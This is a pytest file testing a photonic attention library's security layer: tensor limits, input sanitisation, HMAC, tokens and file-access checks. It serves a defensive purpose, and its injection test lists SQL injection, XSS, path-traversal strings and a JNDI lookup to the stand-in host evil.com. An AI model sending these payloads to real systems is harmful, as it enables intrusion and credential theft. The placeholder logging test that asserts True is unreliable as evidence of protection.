"""Security validation tests for photonic attention system."""

import pytest
import torch
import numpy as np
from unittest.mock import patch, MagicMock

from photonic_flash_attention.utils.security import (
    SecurityManager, sanitize_input, validate_tensor_security, 
    check_permissions, secure_hash, constant_time_compare,
    get_security_manager
)
from photonic_flash_attention.utils.exceptions import PhotonicSecurityError


class TestSecurityManager:
    """Test the security manager functionality."""
    
    def test_initialization(self):
        """Test security manager initialization."""
        manager = SecurityManager()
        
        assert manager.max_tensor_size > 0
        assert manager.max_sequence_length > 0
        assert manager.max_batch_size > 0
        assert len(manager.allowed_dtypes) > 0
        assert len(manager.blocked_paths) > 0
        assert len(manager.session_key) == 32
    
    def test_tensor_security_validation(self):
        """Test tensor security validation."""
        manager = SecurityManager()
        
        # Valid tensor
        valid_tensor = torch.randn(4, 128, 512)
        manager.validate_tensor_security(valid_tensor, "test_tensor")
        
        # Test size limits
        with pytest.raises(PhotonicSecurityError, match="exceeds limit"):
            large_tensor = torch.randn(1000, 10000, 1000)  # Very large
            manager.validate_tensor_security(large_tensor, "large_tensor")
        
        # Test dtype validation
        with pytest.raises(PhotonicSecurityError, match="not in allowed types"):
            invalid_dtype_tensor = torch.randint(0, 255, (4, 128, 512), dtype=torch.uint8)
            manager.validate_tensor_security(invalid_dtype_tensor, "invalid_dtype")
        
        # Test dimension limits
        with pytest.raises(PhotonicSecurityError, match="too many dimensions"):
            high_dim_tensor = torch.randn(2, 2, 2, 2, 2)  # 5 dimensions
            manager.validate_tensor_security(high_dim_tensor, "high_dim")
        
        # Test batch size limits
        with pytest.raises(PhotonicSecurityError, match="Batch size"):
            large_batch_tensor = torch.randn(200, 128, 512)  # Exceeds batch limit
            manager.validate_tensor_security(large_batch_tensor, "large_batch")
        
        # Test sequence length limits
        with pytest.raises(PhotonicSecurityError, match="Sequence length"):
            long_seq_tensor = torch.randn(4, 20000, 512)  # Exceeds sequence limit
            manager.validate_tensor_security(long_seq_tensor, "long_seq")
    
    def test_input_sanitization(self):
        """Test input data sanitization."""
        manager = SecurityManager()
        
        # Valid inputs
        assert manager.sanitize_input("hello world") == "hello world"
        assert manager.sanitize_input(42) == 42
        assert manager.sanitize_input([1, 2, 3]) == [1, 2, 3]
        
        # String sanitization
        with pytest.raises(PhotonicSecurityError, match="path traversal"):
            manager.sanitize_input("../../../etc/passwd")
        
        with pytest.raises(PhotonicSecurityError, match="path traversal"):
            manager.sanitize_input("/etc/shadow")
        
        with pytest.raises(PhotonicSecurityError, match="control characters"):
            manager.sanitize_input("hello\x00world")
        
        with pytest.raises(PhotonicSecurityError, match="too long"):
            manager.sanitize_input("x" * 20000)
        
        # Nested data structures
        nested_data = {
            "key1": "value1",
            "key2": ["item1", "item2"],
            "key3": {"nested": "value"}
        }
        sanitized = manager.sanitize_input(nested_data)
        assert sanitized == nested_data
        
        # Tensor validation
        tensor = torch.randn(4, 128, 512)
        sanitized_tensor = manager.sanitize_input(tensor, allow_tensors=True)
        assert torch.equal(sanitized_tensor, tensor)
        
        with pytest.raises(PhotonicSecurityError, match="not allowed"):
            manager.sanitize_input(tensor, allow_tensors=False)
    
    def test_file_access_validation(self, temp_dir):
        """Test file access validation."""
        manager = SecurityManager()
        
        # Create test file
        test_file = f"{temp_dir}/test.txt"
        with open(test_file, "w") as f:
            f.write("test content")
        
        # Valid file access
        manager.check_file_access(test_file)
        
        # Blocked paths
        for blocked_path in ["/proc/version", "/sys/kernel", "/dev/null", "/etc/passwd"]:
            with pytest.raises(PhotonicSecurityError, match="blocked"):
                manager.check_file_access(blocked_path)
    
    def test_hmac_operations(self):
        """Test HMAC signature operations."""
        manager = SecurityManager()
        
        test_data = b"Hello, World!"
        
        # Compute HMAC
        signature = manager.compute_hmac(test_data)
        assert isinstance(signature, str)
        assert len(signature) == 64  # SHA-256 hex
        
        # Verify HMAC
        assert manager.verify_hmac(test_data, signature)
        
        # Invalid signature
        invalid_sig = "0" * 64
        assert not manager.verify_hmac(test_data, invalid_sig)
        
        # Different data
        other_data = b"Different data"
        assert not manager.verify_hmac(other_data, signature)
    
    def test_secure_token_generation(self):
        """Test secure token generation."""
        manager = SecurityManager()
        
        # Generate tokens
        token1 = manager.generate_secure_token()
        token2 = manager.generate_secure_token()
        
        assert len(token1) == 64  # 32 bytes hex encoded
        assert len(token2) == 64
        assert token1 != token2  # Should be different
        
        # Custom length
        short_token = manager.generate_secure_token(16)
        assert len(short_token) == 32  # 16 bytes hex encoded


class TestSecurityUtilities:
    """Test security utility functions."""
    
    def test_sanitize_input_function(self):
        """Test the sanitize_input utility function."""
        # Valid inputs
        assert sanitize_input("hello") == "hello"
        assert sanitize_input(123) == 123
        
        # Invalid inputs
        with pytest.raises(PhotonicSecurityError):
            sanitize_input("../secret")
    
    def test_validate_tensor_security_function(self):
        """Test the validate_tensor_security utility function."""
        valid_tensor = torch.randn(4, 128, 512)
        validate_tensor_security(valid_tensor, "test")
        
        with pytest.raises(PhotonicSecurityError):
            invalid_tensor = torch.randn(200, 128, 512)  # Too large batch
            validate_tensor_security(invalid_tensor, "invalid")
    
    def test_check_permissions_function(self):
        """Test the check_permissions utility function."""
        # Allowed operations
        assert check_permissions("read", "file.txt") == True
        assert check_permissions("write", "output.log") == True
        
        # Blocked operations
        assert check_permissions("execute", "script.sh") == False
        assert check_permissions("shell", "command") == False
        assert check_permissions("system", "call") == False
    
    def test_secure_hash_function(self):
        """Test the secure_hash utility function."""
        data = "Hello, World!"
        hash1 = secure_hash(data)
        hash2 = secure_hash(data.encode('utf-8'))
        
        assert hash1 == hash2  # Same regardless of input type
        assert len(hash1) == 64  # SHA-256 hex length
        
        # Different data should have different hash
        different_hash = secure_hash("Different data")
        assert hash1 != different_hash
    
    def test_constant_time_compare_function(self):
        """Test the constant_time_compare utility function."""
        string1 = "secret_password"
        string2 = "secret_password"
        string3 = "wrong_password"
        
        assert constant_time_compare(string1, string2) == True
        assert constant_time_compare(string1, string3) == False
        
        # Should work even with different lengths (safely)
        assert constant_time_compare("short", "much_longer_string") == False


class TestAdversarialInputs:
    """Test protection against adversarial inputs."""
    
    def test_large_tensor_attack(self):
        """Test protection against memory exhaustion attacks."""
        manager = SecurityManager()
        
        # Attempt to create extremely large tensor
        with pytest.raises(PhotonicSecurityError):
            # This would be ~400GB if allowed
            huge_tensor = torch.randn(10000, 10000, 1000)
            manager.validate_tensor_security(huge_tensor, "huge")
    
    def test_malformed_attention_inputs(self):
        """Test handling of malformed attention inputs."""
        from photonic_flash_attention.utils.validation import validate_attention_inputs
        from photonic_flash_attention.utils.exceptions import PhotonicComputationError
        
        # Valid inputs
        query = torch.randn(2, 128, 512)
        key = torch.randn(2, 128, 512)
        value = torch.randn(2, 128, 512)
        
        validate_attention_inputs(query, key, value)
        
        # Mismatched batch sizes
        with pytest.raises(PhotonicComputationError):
            bad_key = torch.randn(3, 128, 512)  # Different batch size
            validate_attention_inputs(query, bad_key, value)
        
        # Mismatched embed dimensions
        with pytest.raises(PhotonicComputationError):
            bad_value = torch.randn(2, 128, 256)  # Different embed dim
            validate_attention_inputs(query, key, bad_value)
    
    def test_injection_attacks(self):
        """Test protection against injection attacks."""
        manager = SecurityManager()
        
        # SQL injection patterns
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/payload}",
            "../../etc/passwd",
            "../../../windows/system32/config/sam",
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(PhotonicSecurityError):
                manager.sanitize_input(malicious_input)
    
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        # Test constant-time comparison
        correct = "secret_password_123"
        wrong_prefix = "secret_password_124"
        wrong_short = "wrong"
        
        import time
        
        # Measure timing for different comparisons
        times = []
        
        for test_string in [correct, wrong_prefix, wrong_short]:
            start = time.perf_counter()
            for _ in range(1000):
                constant_time_compare(correct, test_string)
            end = time.perf_counter()
            times.append(end - start)
        
        # Times should be relatively similar (within reasonable variance)
        max_time = max(times)
        min_time = min(times)
        
        # Allow for some variance but prevent obvious timing leaks
        assert (max_time - min_time) / min_time < 0.5  # Less than 50% difference
    
    def test_memory_bomb_protection(self):
        """Test protection against memory bomb attacks."""
        manager = SecurityManager()
        
        # Nested data structures that could cause exponential memory growth
        nested_bomb = {"a": {}}
        current = nested_bomb["a"]
        
        # Create deeply nested structure
        for i in range(10):
            current["nested"] = {}
            current = current["nested"]
        
        # Should handle deep nesting without issues
        sanitized = manager.sanitize_input(nested_bomb)
        assert isinstance(sanitized, dict)
        
        # Test circular references (would cause infinite recursion)
        circular = {"self": None}
        circular["self"] = circular
        
        # Should detect and handle circular references
        with pytest.raises((RecursionError, PhotonicSecurityError)):
            manager.sanitize_input(circular)


class TestSecurityIntegration:
    """Test security integration with main components."""
    
    @patch('photonic_flash_attention.utils.security.get_security_manager')
    def test_attention_security_integration(self, mock_security_manager, sample_tensors):
        """Test that attention modules use security validation."""
        from photonic_flash_attention.core.photonic_attention import PhotonicAttention
        
        # Mock security manager
        mock_manager = MagicMock()
        mock_security_manager.return_value = mock_manager
        
        query, key, value, mask = sample_tensors
        
        # Create attention module with safety checks enabled
        attention = PhotonicAttention(
            embed_dim=query.shape[-1],
            num_heads=8,
            safety_checks=True,
        )
        
        try:
            # This should call security validation
            attention(query, key, value, mask)
        except Exception:
            pass  # We expect this to fail due to missing photonic hardware
        
        # Verify security validation was called (through validation functions)
        # The actual calls happen in validation.py, so we just check the module was used
        assert mock_security_manager.called
    
    def test_configuration_security(self, temp_dir):
        """Test secure configuration handling."""
        from photonic_flash_attention.utils.security import SecureConfig
        
        config = SecureConfig()
        
        # Valid configuration keys
        config.set("max_batch_size", 64)
        config.set("temperature_limit", 80.0)
        
        assert config.get("max_batch_size") == 64
        assert config.get("temperature_limit") == 80.0
        
        # Invalid configuration keys
        with pytest.raises(PhotonicSecurityError):
            config.set("../malicious", "value")
        
        with pytest.raises(PhotonicSecurityError):
            config.set("key@#$%", "value")
    
    def test_logging_security(self):
        """Test that logging doesn't leak sensitive information."""
        from photonic_flash_attention.utils.logging import get_logger
        
        logger = get_logger("test_security")
        
        # Mock a scenario where sensitive data might be logged
        sensitive_data = {
            "password": "secret123",
            "api_key": "sk-1234567890abcdef",
            "private_key": "-----BEGIN PRIVATE KEY-----",
        }
        
        # Logger should not expose sensitive fields directly
        # (In a real implementation, you'd have filters for this)
        logger.info("Processing data", extra={"user_id": 12345})
        
        # This test verifies the logging system exists and can be called safely
        assert True  # If we get here, no exceptions were raised